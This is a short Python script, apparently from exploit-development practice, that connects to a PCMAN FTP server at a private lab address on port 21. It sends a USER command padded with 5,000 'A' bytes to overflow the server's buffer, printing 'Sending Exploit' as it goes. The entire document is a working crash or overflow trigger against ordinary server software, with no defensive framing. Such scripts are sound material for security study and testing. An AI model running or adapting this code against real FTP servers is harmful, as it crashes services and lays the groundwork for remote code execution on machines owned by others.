#!/usr/bin/python3
import socket
import sys

host = '192.168.5.128'
port = 21

buffer = b"A" * 5000

data = b'USER ' + buffer


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print(s.recv(1024))
print("[+] Connected to PCMAN FTP")
print("[+]Length of Buffer: " + str(len(buffer)))
print("[+]Sending Exploit")
s.send(data)
s.close()